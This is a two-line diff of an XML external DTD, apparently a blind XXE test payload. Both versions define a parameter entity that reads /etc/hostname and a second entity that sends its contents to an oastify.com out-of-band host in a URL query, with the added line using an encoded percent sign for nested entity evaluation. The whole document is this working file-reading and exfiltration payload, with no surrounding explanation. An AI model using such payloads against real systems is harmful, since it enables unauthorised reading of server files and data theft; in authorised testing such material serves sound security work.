@@ -1,2 +1,2 @@
 <!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://eygs6k1pxygjkzc1r7hvktxuul0co6cv.oastify.com/?d=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://064ee69b5ko5slknztphsf5g278ywtki.oastify.com/?d=%file;'>">
